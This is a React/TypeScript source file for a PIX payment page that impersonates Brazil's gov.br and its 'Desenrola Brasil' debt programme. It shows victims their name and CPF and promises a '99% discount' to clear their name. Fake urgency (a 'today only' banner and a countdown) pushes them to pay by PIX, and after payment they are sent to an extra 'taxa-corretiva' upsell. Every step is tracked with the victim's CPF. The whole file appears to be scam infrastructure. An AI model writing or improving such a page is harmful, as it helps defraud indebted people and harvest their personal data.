import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState } from "react";
import QRCode from "qrcode";
import { media } from "@/lib/media";
import { track, registerPendingPurchase } from "@/lib/tracking";
const iconeGov = { url: media.iconeGov };

export const Route = createFileRoute("/pagamento")({
  head: () => ({
    meta: [
      { title: "Pagamento PIX - Desenrola Brasil" },
      { name: "description", content: "Realize o pagamento do seu acordo via PIX e limpe seu nome pelo Programa Desenrola Brasil." },
      { property: "og:title", content: "Pagamento PIX - Desenrola Brasil" },
      { property: "og:description", content: "Conclua seu acordo com desconto e limpe seu nome via PIX." },
    ],
  }),
  ssr: false,
  component: PagamentoPage,
});

type Query = { cpf: string; nome: string; phone: string; email: string; valor: string; acordo: string };

function formatCPF(v: string) {
  const d = String(v || "").replace(/\D/g, "").slice(0, 11);
  if (d.length <= 3) return d;
  if (d.length <= 6) return `${d.slice(0, 3)}.${d.slice(3)}`;
  if (d.length <= 9) return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6)}`;
  return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
}

function formatPhone(v: string) {
  const d = String(v || "").replace(/\D/g, "").slice(0, 11);
  if (d.length <= 2) return d;
  if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
  return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
}

function captureAttribution() {
  const params = new URLSearchParams(window.location.search);
  const keys = ["gclid", "gbraid", "wbraid", "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"];
  const out: Record<string, string> = {};
  for (const key of keys) {
    const value = params.get(key);
    if (value) out[key] = value.slice(0, 300);
  }
  return out;
}

function PagamentoPage() {
  const [q, setQ] = useState<Query | null>(null);
  const [phone, setPhone] = useState("");
  const [stage, setStage] = useState<"confirm" | "loading" | "pix" | "paid" | "expired">("confirm");
  const [copyPaste, setCopyPaste] = useState("");
  const [qrCodeUrl, setQrCodeUrl] = useState("");
  const [qrVisible, setQrVisible] = useState(false);
  const [transactionId, setTransactionId] = useState("");
  const [errorMsg, setErrorMsg] = useState("");
  const [copied, setCopied] = useState(false);
  const [phoneError, setPhoneError] = useState("");
  const [seconds, setSeconds] = useState(15 * 60);
  const tickRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    const p = new URLSearchParams(window.location.search);
    const parsed: Query = {
      cpf: p.get("cpf") || "",
      nome: p.get("nome") || "Cliente",
      phone: p.get("phone") || "",
      email: "cliente@gmail.com",
      valor: p.get("valor") || "R$ 68,92",
      acordo: p.get("acordo") || "",
    };
    setQ(parsed);
    setPhone(formatPhone(parsed.phone));
    track("pagamento", "pagamento_view", { cpf: parsed.cpf, nome: parsed.nome, acordo: parsed.acordo });
  }, []);

  const amountCents = useMemo(() => {
    if (!q) return 6892;
    const m = q.valor.match(/(\d+)[,.](\d{2})/);
    return m ? parseInt(m[1], 10) * 100 + parseInt(m[2], 10) : 6892;
  }, [q]);

  const stopAll = () => {
    if (tickRef.current) clearInterval(tickRef.current);
    if (pollRef.current) clearInterval(pollRef.current);
    tickRef.current = null;
    pollRef.current = null;
  };

  useEffect(() => () => stopAll(), []);

  const handleConfirm = async () => {
    if (!q) return;
    const raw = phone.replace(/\D/g, "");
    if (raw.length < 10) {
      setPhoneError("Por favor, informe um telefone válido com DDD.");
      return;
    }
    setPhoneError("");
    setErrorMsg("");
    setStage("loading");
    try {
      const res = await fetch("/api/public/pix/criar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cpf: q.cpf,
          nome: q.nome,
          email: "cliente@gmail.com",
          phone: raw,
          amount_cents: amountCents,
          acordo: q.acordo || "DBR",
          attribution: captureAttribution(),
        }),
      });
      const data = await res.json();
      if (!res.ok || !data.success) {
        setErrorMsg(data?.message || `Erro ${res.status} ao gerar PIX.`);
        setStage("expired");
        return;
      }
      setTransactionId(data.transactionId || "");
      if (data.transactionId) {
        registerPendingPurchase(data.transactionId, amountCents / 100, {
          cpf: q.cpf,
          nome: q.nome,
          phone: raw,
          acordo: q.acordo,
          redirectPath: "/upsell/taxa-corretiva",
        });
      }
      const cp = data.copyPaste || "";
      setCopyPaste(cp);
      setQrVisible(false);
      if (cp) {
        try {
          const dataUrl = await QRCode.toDataURL(cp, { margin: 1, width: 320, errorCorrectionLevel: "M" });
          setQrCodeUrl(dataUrl);
        } catch {
          setQrCodeUrl("");
        }
      } else {
        setQrCodeUrl("");
      }
      setStage("pix");
      track("pagamento", "pagamento_pix_gerado", { cpf: q.cpf, nome: q.nome, acordo: q.acordo, meta: { transactionId: data.transactionId, amount_cents: amountCents } });

      tickRef.current = setInterval(() => {
        setSeconds((s) => {
          if (s <= 1) {
            if (tickRef.current) clearInterval(tickRef.current);
            tickRef.current = null;
            setStage((cur) => (cur === "paid" ? cur : "expired"));
            return 0;
          }
          return s - 1;
        });
      }, 1000);

      if (data.transactionId) {
        const startedAt = Date.now();
        pollRef.current = setInterval(async () => {
          try {
            const r = await fetch(`/api/public/pix/status?id=${encodeURIComponent(data.transactionId)}`, { cache: "no-store" });
            const j = await r.json();
            if (j.status === "PAID") {
              stopAll();
              setStage("paid");
              track("pagamento", "pagamento_pix_pago", { cpf: q.cpf, nome: q.nome, acordo: q.acordo, meta: { transactionId: data.transactionId } });
              try {
                const params = new URLSearchParams({
                  cpf: q.cpf || "",
                  nome: q.nome || "",
                  phone: raw,
                  acordo: q.acordo || "",
                });
                // Sem rastreamento externo: segue direto para o upsell.
                track("pagamento", "pagamento_redirect_upsell", { cpf: q.cpf, nome: q.nome, acordo: q.acordo, meta: { transactionId: data.transactionId } });
                window.location.assign(`/upsell/taxa-corretiva?${params.toString()}`);
              } catch {}
            } else if (["FAILED", "REFUSED"].includes(j.status)) {
              stopAll();
              setStage("expired");
            } else if (Date.now() - startedAt > 25 * 60 * 1000) {
              // Para o polling após 25min (15min do timer + 10min de graça).
              if (pollRef.current) clearInterval(pollRef.current);
              pollRef.current = null;
            }
          } catch {}
        }, 3000);
      }
    } catch (e) {
      setErrorMsg("Não foi possível conectar. Verifique sua conexão.");
      setStage("expired");
    }
  };

  const copiar = async () => {
    try {
      await navigator.clipboard.writeText(copyPaste);
    } catch {
      const ta = document.createElement("textarea");
      ta.value = copyPaste;
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      try { document.execCommand("copy"); } catch {}
      ta.remove();
    }
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");
  const urgente = seconds < 120;

  if (!q) {
    return (
      <div style={{ fontFamily: "'Inter', system-ui, sans-serif", background: "#f0f2f5", minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <div style={{ color: "#666", fontSize: 14 }}>Carregando...</div>
      </div>
    );
  }

  return (
    <div className="flex flex-col min-h-screen bg-[#f0f2f5] font-['Inter',system-ui,sans-serif]">
      <style>{`
        @keyframes pg-spin { to { transform: rotate(360deg); } }
        @keyframes pg-blink { 0%,100% { opacity: 1; } 50% { opacity: .2; } }
      `}</style>

      <header className="bg-white border-b-3 border-[#1351B4] shadow-[0_2px_8px_rgba(0,0,0,0.1)] h-[58px] flex items-center justify-between px-4 shrink-0 sticky top-0 z-10">
        <img src={iconeGov.url} alt="gov.br" className="h-[34px]" />
        <button className="bg-[#1351B4] text-white border-none rounded-[50px] px-3.5 py-1.5 flex items-center gap-1.5 text-sm font-medium">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
          </svg>
          <span>{q?.nome ? q.nome.split(" ")[0] : "Cliente"}</span>
        </button>
      </header>

      <div style={{ maxWidth: 480, margin: "0 auto", padding: "20px 16px 48px", width: "100%" }}>
        {stage === "confirm" && (
          <>
            <div style={{ background: "#FEF3C7", border: "1.5px solid #F59E0B", borderRadius: 10, padding: "12px 16px", display: "flex", alignItems: "center", gap: 10, marginBottom: 16, fontSize: 13, fontWeight: 600, color: "#92400E" }}>
              <span style={{ fontSize: 20, flexShrink: 0 }}>⏰</span>
              <span>Oferta válida somente hoje! Realize o pagamento para limpar seu nome.</span>
            </div>

            <Card>
              <CardTitle>Resumo do Acordo</CardTitle>
              <Row label="Beneficiário" value={q.nome} />
              <Row label="CPF" value={formatCPF(q.cpf) || "—"} />
              <Row label="Código do acordo" value={q.acordo || "—"} />
              <Row label="Desconto" value="99% de desconto" highlight />
              <Row label="Valor" value={q.valor} highlight />
            </Card>
          </>
        )}

        {stage === "confirm" && (
          <Card>
            <CardTitle>Confirme seus dados</CardTitle>
            <Row label="Nome" value={q.nome} />
            <Row label="CPF" value={formatCPF(q.cpf) || "—"} />
            <div style={{ padding: "10px 0" }}>
              <div style={{ fontSize: 13, color: "#666", marginBottom: 6 }}>Telefone (WhatsApp) *</div>
              <input
                type="tel"
                inputMode="numeric"
                placeholder="( ) _____-____"
                value={phone}
                onChange={(e) => { setPhone(e.target.value); setPhoneError(""); }}
                onBlur={() => setPhone(formatPhone(phone))}
                style={{ padding: 10, border: phoneError ? "1px solid #DC2626" : "1px solid #ccc", borderRadius: 6, width: "100%", fontSize: "16px", fontFamily: "inherit" }}
              />
              {phoneError && <div style={{ color: "#DC2626", fontSize: 12, marginTop: 4 }}>{phoneError}</div>}
            </div>
            <button onClick={handleConfirm} style={{ ...btnPrimary, background: "#16a34a" }}>Confirmar dados e gerar PIX</button>
          </Card>
        )}

        {stage !== "confirm" && (
          <div style={{ background: "#fff", borderRadius: 14, boxShadow: "0 2px 12px rgba(0,0,0,.08)", padding: "24px 20px", textAlign: "center" }}>
            {stage === "pix" && (
              <div style={{ marginBottom: 12, fontSize: 14, fontWeight: 700, color: "#DC2626" }}>
                NEGOCIAÇÃO DESENROLA - EXPIRA EM: {mm}:{ss}
              </div>
            )}
            <div style={{ fontSize: 32, fontWeight: 800, color: "#1351B4", marginBottom: 4 }}>{q.valor}</div>
            <div style={{ fontSize: 13, color: "#888", marginBottom: 20 }}>Valor total do acordo</div>

            {stage === "loading" && (
              <div style={{ padding: "20px 0 10px" }}>
                <div style={{ width: 44, height: 44, border: "4px solid #e5e7eb", borderTopColor: "#1351B4", borderRadius: "50%", animation: "pg-spin .8s linear infinite", margin: "0 auto 16px" }} />
                <div style={{ fontSize: 14, color: "#666" }}>Gerando seu PIX...</div>
              </div>
            )}

            {stage === "pix" && (
              <>
                {qrCodeUrl && (
                  <div style={{ display: "flex", flexDirection: "column", alignItems: "center", marginBottom: 14 }}>
                    <button
                      type="button"
                      onClick={() => setQrVisible((v) => !v)}
                      style={{ background: "transparent", border: "1.5px solid #1351B4", color: "#1351B4", fontWeight: 600, fontSize: 13, padding: "8px 16px", borderRadius: 8, cursor: "pointer" }}
                    >
                      {qrVisible ? "Ocultar QR code" : "Exibir QR code"}
                    </button>
                    {qrVisible && (
                      <img src={qrCodeUrl} alt="QR code PIX" style={{ width: 220, height: 220, border: "1px solid #eee", borderRadius: 8, background: "#fff", marginTop: 12 }} />
                    )}
                  </div>
                )}
                <div style={{ background: "#f0f4ff", border: "1.5px dashed #1351B4", borderRadius: 10, padding: "12px 14px", marginBottom: 14 }}>
                  <div style={{ fontSize: 11, fontWeight: 700, color: "#1351B4", textTransform: "uppercase", letterSpacing: ".05em", marginBottom: 6 }}>PIX Copia e Cola</div>
                  <div style={{ fontSize: 11, fontFamily: "monospace", color: "#333", wordBreak: "break-all", lineHeight: 1.5, marginBottom: 10, textAlign: "left" }}>{copyPaste || "—"}</div>
                  <button onClick={copiar} style={{ ...btnPrimary, background: copied ? "#059669" : "#1351B4", marginTop: 0 }}>
                    {copied ? "✔ Código copiado!" : "Copiar código PIX"}
                  </button>
                </div>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "#EFF6FF", borderRadius: 8, padding: "10px 14px", marginTop: 14, fontSize: 13, fontWeight: 600, color: "#1351B4" }}>
                  <span style={{ width: 8, height: 8, background: "#1351B4", borderRadius: "50%", animation: "pg-blink 1.2s infinite" }} />
                  Aguardando pagamento...
                </div>
                <ComprovanteUpload transactionId={transactionId} acordo={q.acordo} cpf={q.cpf} nome={q.nome} />
              </>
            )}

            {stage === "paid" && (
              <div style={{ textAlign: "center", padding: "20px 0 10px" }}>
                <div style={{ width: 72, height: 72, background: "#D1FAE5", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px", fontSize: 36 }}>✅</div>
                <div style={{ fontSize: 20, fontWeight: 800, color: "#059669", marginBottom: 8 }}>Pagamento confirmado!</div>
                <div style={{ fontSize: 14, color: "#555", lineHeight: 1.6 }}>
                  Seu nome será limpo em até <strong>72 horas úteis.</strong><br />
                  Guarde o código do acordo: <strong>{q.acordo || transactionId || "—"}</strong>
                </div>
              </div>
            )}

            {stage === "expired" && (
              <div style={{ textAlign: "center", padding: "10px 0" }}>
                <div style={{ fontSize: 40, marginBottom: 12 }}>❌</div>
                <div style={{ fontSize: 16, fontWeight: 700, color: "#DC2626", marginBottom: 8 }}>{errorMsg ? "Não foi possível gerar o PIX" : "Pagamento não identificado"}</div>
                <div style={{ fontSize: 13, color: "#666", marginBottom: 16 }}>{errorMsg || "O PIX expirou. Clique abaixo para gerar um novo código."}</div>
                <button onClick={() => window.location.reload()} style={{ background: "#1351B4", color: "#fff", border: "none", borderRadius: 8, padding: "11px 24px", fontSize: 14, fontWeight: 600, fontFamily: "inherit", cursor: "pointer" }}>Tentar novamente</button>
              </div>
            )}
          </div>
        )}

      </div>

      <footer className="bg-[#071D41] h-[72px] flex flex-col justify-center px-[18px] shrink-0 mt-auto w-full">
        <div className="text-white text-lg font-extrabold tracking-[-0.5px] mb-0.5">gov.br</div>
        <div className="text-[#E08D1E] text-[11px]">Todo o conteúdo deste site está publicado sob a licença</div>
        <div className="text-white text-[11px] font-bold">Sistema de Renegociação - Todos os direitos reservados</div>
      </footer>
    </div>
  );
}

const btnPrimary: React.CSSProperties = {
  width: "100%",
  padding: 14,
  background: "#1351B4",
  color: "#fff",
  border: "none",
  borderRadius: 8,
  fontSize: 14,
  fontWeight: 700,
  fontFamily: "inherit",
  cursor: "pointer",
  marginTop: 20,
};

function Card({ children }: { children: React.ReactNode }) {
  return (
    <div style={{ background: "#fff", borderRadius: 14, boxShadow: "0 2px 12px rgba(0,0,0,.08)", padding: 20, marginBottom: 16 }}>
      {children}
    </div>
  );
}

function CardTitle({ children }: { children: React.ReactNode }) {
  return (
    <div style={{ fontSize: 13, fontWeight: 700, color: "#888", textTransform: "uppercase", letterSpacing: ".05em", marginBottom: 14 }}>
      {children}
    </div>
  );
}

function Row({ label, value, highlight }: { label: string; value: string; highlight?: boolean }) {
  return (
    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "6px 0", borderTop: "1px solid #f0f0f0" }}>
      <span style={{ fontSize: 13, color: "#666" }}>{label}</span>
      <span style={{ fontSize: 13, fontWeight: 600, color: highlight ? "#1351B4" : "#1a1a1a", textAlign: "right", maxWidth: "60%" }}>{value}</span>
    </div>
  );
}

function ComprovanteUpload({ transactionId, acordo, cpf, nome }: { transactionId: string; acordo: string; cpf: string; nome: string }) {
  const [fileName, setFileName] = useState<string>("");
  const [status, setStatus] = useState<"idle" | "sending" | "ok" | "error">("idle");
  const [msg, setMsg] = useState("");

  const send = async (file: File) => {
    if (file.size > 5 * 1024 * 1024) { setStatus("error"); setMsg("Arquivo maior que 5MB."); return; }
    setStatus("sending"); setMsg("");
    try {
      const b64 = await new Promise<string>((resolve, reject) => {
        const r = new FileReader();
        r.onload = () => {
          const s = String(r.result || "");
          resolve(s.includes(",") ? s.split(",")[1] : s);
        };
        r.onerror = () => reject(new Error("read"));
        r.readAsDataURL(file);
      });
      const res = await fetch("/api/public/comprovante/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          transaction_id: transactionId || null,
          acordo, cpf, nome,
          filename: file.name,
          mime: file.type || "application/octet-stream",
          size_bytes: file.size,
          data_base64: b64,
        }),
      });
      const j = await res.json().catch(() => ({}));
      if (!res.ok || !j.ok) { setStatus("error"); setMsg("Falha ao enviar. Tente novamente."); return; }
      track("pagamento", "pagamento_comprovante_upload", { cpf, nome, acordo, meta: { transactionId, filename: file.name, size: file.size } });
      setStatus("ok");
      setMsg("Comprovante recebido! Estamos analisando seu pagamento.");
    } catch {
      setStatus("error"); setMsg("Erro ao processar o arquivo.");
    }
  };

  return (
    <div style={{ marginTop: 18, padding: 14, background: "#FFFBEB", border: "1.5px solid #F59E0B", borderRadius: 10, textAlign: "left" }}>
      <div style={{ fontSize: 14, fontWeight: 700, color: "#92400E", marginBottom: 4 }}>Já realizou o pagamento?</div>
      <div style={{ fontSize: 12, color: "#78350F", marginBottom: 10, lineHeight: 1.5 }}>
        Envie o comprovante em PDF ou imagem (até 5MB) para acelerarmos a análise caso o sistema ainda não tenha identificado seu PIX. O envio começa automaticamente ao selecionar o arquivo.
      </div>
      
      <div style={{ fontSize: 13, color: "#555", lineHeight: 1.6, marginBottom: 16, marginTop: 12 }}>
        <ol style={{ paddingLeft: 18, margin: 0 }}>
          <li>Abra o app do seu banco</li>
          <li>Escolha a opção <strong>Pagar com PIX</strong></li>
          <li>Escaneie o QR code ou copie o código acima</li>
        </ol>
      </div>
      {status !== "ok" && (
        <input
          type="file"
          accept="image/*,application/pdf"
          disabled={status === "sending"}
          onChange={(e) => {
            const f = e.target.files?.[0];
            if (!f) return;
            setFileName(f.name);
            void send(f);
          }}
          style={{ display: "block", width: "100%", padding: 8, background: "#fff", border: "1px solid #F59E0B", borderRadius: 6, fontSize: 13 }}
        />
      )}
      {status === "sending" && (
        <div style={{ marginTop: 10, fontSize: 13, fontWeight: 600, color: "#92400E" }}>
          Enviando {fileName}...
        </div>
      )}
      {msg && (
        <div style={{ marginTop: 10, fontSize: 13, fontWeight: 600, color: status === "ok" ? "#059669" : "#DC2626" }}>{msg}</div>
      )}
    </div>
  );
}

